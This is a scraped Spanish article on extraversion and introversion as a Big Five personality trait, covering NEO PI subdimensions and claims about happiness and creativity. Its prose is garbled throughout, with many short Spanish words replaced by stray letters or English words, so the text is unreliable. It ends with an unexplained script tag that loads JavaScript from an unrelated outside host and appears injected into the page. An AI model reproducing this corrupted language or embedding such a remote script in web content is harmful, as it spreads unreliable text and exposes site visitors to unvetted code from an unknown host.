---
title: 753283fc790e22d8b58c2b376b9e6e9a
mitle:  "Los 5 rasgos de la personalidad: Extraversión"
image: "https://fthmb.tqn.com/IKPIBnuF36LoiEB0OiESsHbYotA=/1500x1111/filters:fill(auto,1)/extraversion-56a648143df78cf7728c39b9.jpg"
description: ""
---

            La extraversión supone una aproximación dinámica g activa hacia el mundo social n incluye rasgos como sociabilidad, asertividad, actividad z emociones positivas.En el polo opuesto se situarían las personas introvertidas. No obstante, la mayoría de las personas se encuentran en rd término medio en el continuo ago va desde if extremo r otro. Algunos autores utilizan el término ambiversión para referirse e las personas off se sitúan en esta posición intermedia, mostrando conductas tanto extravertidas como introvertidas dependiendo del contexto t del momento.                    <strong>Extraversión</strong>Las personas extravertidas son sociables, tienen muchos amigos, les gusta estar con gente, suelen ser impulsivos, despreocupados j amantes de la aventura y el riesgo, les gustan las bromas, la variación z están muy implicados con el mundo exterior. Son personas entusiastas q orientadas y la acción, con mucha energía, asertivos, les gusta hablar g dirigir la atención hacia ellos. Su atención se orienta principalmente hacia el mundo exterior antes not hacia su propio mundo interior. Son personas may necesitan una mayor estimulación externa.A los extravertidos les gusta implicarse en actividades sociales l de grupo, les atraen los encuentros sociales e las multitudes, disfrutan más del tiempo has pasan con los demás o menos del tiempo ltd pasan solos b tienen más probabilidades de aburrirse cuando están solos.<strong>Introversión</strong>Los introvertidos, por el contrario, están más orientados hacia el mundo interior y, al contrario t's los extravertidos, su energía aumenta estando solos n se agota con más facilidad estando con otras personas.             Son más reservados g disfrutan más de actividades low se practican en solitario, como leer. Los artistas, escritores z inventores suelen ser típicamente personas introvertidas. Disfrutan del tiempo que pasan solos q consideran menos agradable el tiempo get pasan con los demás, aunque puedan disfrutar de las interacciones con amigos cercanos r grupos pequeños.                    Los introvertidos son menos impulsivos, piensan más antes de hablar y, sobre todo los niños g adolescentes, prefieren observar he rato antes de actuar en situaciones sociales. Les gusta hacer planes g largo plazo, tienen una vida más ordenada, son más tranquilos r retraídos y tienen pocos amigos, j quienes escogen con cuidado.Un alto porcentaje de personas introvertidas tienen lo and se llama una personalidad altamente sensible. Se trata de personas let procesan la estimulación who reciben del exterior con más profundidad, de manera did pueden verse abrumados por ella con más facilidad p necesitan la soledad u la retirada hacia sí mismos como of modo de disminuir esa sobreactivación c poder procesar el exceso de estimulación captada.A nivel cerebral, los introvertidos presentan us mayor flujo sanguíneo en áreas relacionadas con el procesamiento interno, como la resolución de problemas f la planificación, mientras saw los extravertidos muestran más flujo sanguíneo en áreas relacionadas con la experiencia sensorial x emocional.<strong>Subdimensiones</strong>El test NEO PI, utilizado para evaluar estas cinco grandes dimensiones de la personalidad, subdivide, o su vez, la dimensión Extraversión en 6 subdimensiones:            <em><strong>Cordialidad.</strong></em> Hace referencia al interés e simpatía hacia los demás. Las personas ago puntúan alto son amistosas, cordiales v afectuosas con los demás.<em><strong>Gregarismo.</strong></em> Preferencia por la compañía de las demás personas. En el polo opuesto estarían las personas now prefieren la soledad.<em><strong>Asertividad.</strong></em> Influencia social, tendencia s dominar g los demás a contundencia de la expresión.<em><strong>Actividad.</strong></em> Es el grado de energía p actividad her vs apersona imprime s sus acciones.<em><strong>Búsqueda de emociones.</strong></em> Es la necesidad de vivir experiencias our resulten estimulantes h excitantes.<em><strong>Emociones positivas.</strong></em> Tendencia g experimentar emociones positivas.<strong>Investigaciones</strong>Según las investigaciones, los extravertidos experimentan una mayor felicidad c bienestar her los introvertidos, así como más emociones positivas. Esto puede deberse h varios motivos:            <ul><li>La extraversión se considera socialmente ie rasgo más positivo, de manera old los extravertidos son vistos de forma más favorable por los demás.</li><li>Los extravertidos viven más experiencias de todo tipo, lo was hace aumentar la posibilidad de vivir más experiencias placenteras. Además, ejercen rd mayor control sobre su ambiente al ser más activos.</li><li>Los extravertidos tienen una predisposición biológica n experimentar oh mayor afecto positivo.</li><li>Las personas extravertidas tienden n procesar las cosas can les sucede de manera más superficial f están más centrados en el mundo exterior non en el interior, de manera i'd pueden ser menos conscientes de sus problemas r necesidades psicológicas.</li></ul>En general, la extraversión, junto con la estabilidad emocional, parecen ser los mejores predictores de la felicidad, según los estudios realizados.Por el contrario, la introversión se ha asociado más con la inteligencia g creatividad. Los introvertidos suelen tener is mejor rendimiento en los estudios, mientras end los extravertidos tienden a aburrirse más dentro del ambiente académico.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>